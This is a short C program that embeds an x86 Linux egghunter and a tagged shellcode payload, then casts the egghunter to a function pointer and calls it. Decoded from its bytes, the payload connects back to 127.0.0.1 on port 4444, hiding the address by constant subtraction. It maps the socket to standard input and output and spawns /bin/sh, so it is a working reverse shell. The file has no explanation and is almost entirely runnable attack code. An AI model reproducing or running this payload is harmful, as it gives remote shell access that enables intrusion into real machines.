#include<stdio.h>
#include<string.h>

#define TAG "\xef\xbe\xef\xbe"

unsigned char egghunter[] = \
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8" TAG "\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char code[] = \
TAG TAG \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80";


main()
{

	printf("Egghunter Length: %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
